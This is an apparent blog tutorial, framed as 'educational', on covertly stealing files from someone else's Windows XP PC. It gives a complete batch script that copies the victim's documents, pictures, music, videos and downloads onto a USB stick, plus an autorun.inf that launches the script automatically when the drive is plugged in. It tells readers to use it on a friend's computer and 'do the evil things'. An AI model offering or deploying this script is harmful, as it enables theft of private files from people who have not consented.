@@ -1,0 +1,146 @@
+How To Steal Files From Other Computer 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+In today’s article I am going to teach you something illegal but only for educational propose. This only demonstrates how you can copy files from your friend’s PC as soon as you plug in your flash drive or any removable storage media.
+
+
+I am going to teach you how you can do this from batch file with the help of autorun.inf file.
+Let me tell you the basic things what will happen.
+
+
+
+
+
+When you plug in in your Pen drive, system will look up for autorun.inf (incase if autorun is not disabled for your drive from the system).
+
+
+Then we’ll input some command in autorun.inf in such a way that it will load the batch file that does the magic of copying all the files from your PC. In this demonstration I am copying only the files and folders in My Documents.
+
+
+Here goes the batch code:
+
+
+
+
+
+
+
+
+
+
+
+
+@echo off
+:CHECK
+if not exist "%homedrive%\Copied_files" md "%homedrive%\Copied_files"
+if exist "%systemdrive%\Documents and Settings" goto COPIER
+goto ERROR
+
+
+:COPIER
+if not exist "%homedrive%\Copied_files\%computername%" md "%homedrive%\Copied_files\%computername%"
+if not exist "%homedrive%\Copied_files\%computername%\VIDEOS" md "%homedrive%\Copied_files\%computername%\VIDEOS"
+if not exist "%homedrive%\Copied_files\%computername%\PICTURES" md "%homedrive%\Copied_files\%computername%\PICTURES"
+if not exist "%homedrive%\Copied_files\%computername%\MUSIC" md "%homedrive%\Copied_files\%computername%\MUSIC"
+if not exist "%homedrive%\Copied_files\%computername%\DOWNLOADS" md "%homedrive%\Copied_files\%computername%\DOWNLOADS"
+copy /y "%userprofile%\My Documents\*.*" "%homedrive%\Copied_files\%computername%"
+copy /y "%userprofile%\My Documents\My Videos" "%homedrive%\Copied_files\%computername%\VIDEOS"
+copy /y "%userprofile%\My Documents\My Music" "%homedrive%\Copied_files\%computername%\MUSIC"
+copy /y "%userprofile%\My Documents\My Pictures" "%homedrive%\Copied_files\%computername%\PICTURES"
+copy /y "%userprofile%\My Documents\Downloads" "%homedrive%\Copied_files\%computername%\DOWNLOADS"
+MSG %username% "DONE!"
+exit
+
+
+
+
+
+:ERROR
+exit
+
+
+What it actually does is in first case ,CHECK it checks if your removable storage have Copied_files folder or not. If it doesn’t have then it creates one by using MD (Make Directory) command.
+
+
+Again it checks if you have documents and settings folder then it will assume that you are using windows XP. Other wise it will return an error and exits.
+
+
+This happens because; in Windows XP the user’s documents are usually stored in %systemroot%\Documents and Settings folder.
+
+
+Now I’ve defined another two cases after the first case CHECK, that is COPIER case and ERROR case.
+
+
+Case COPIER will execute when the program recognizes it is Windows XP, where the real coying work goes o.
+
+
+Case ERROR will execute when the Documents and Settings doesn’t exists in your system root.
+
+
+This is just a simple use of Batch programming. Copy the above code and paste it in notepad and save it as Filename.bat.
+
+
+Now let’s create a file that will load it automatically.
+
+
+
+[autorun]
+Open=Filename.bat
+Action=File Copier
+
+
+The above code goes in autorun.inf file. Open notepad and copy it and paste it and save as autorun.inf.
+
+
+Copy the two files, autorun.inf and Filename.bat in your flash drive.
+
+
+Then plug in your device to your friends PC and do the evil things.
+
+
+Where is the flaw?
+
+
+It shows Command prompt window and process of copying (thank god your noob never think that it actually copying).
+
+
+
+
+
+Another thing is that it determines the windows by searching the file users and Docuemnts and settings, which is not the right way to determine your system operating system.
+
+
+However this is just an educational tutorial.
+
+
+Hope this tutorial was helpful.
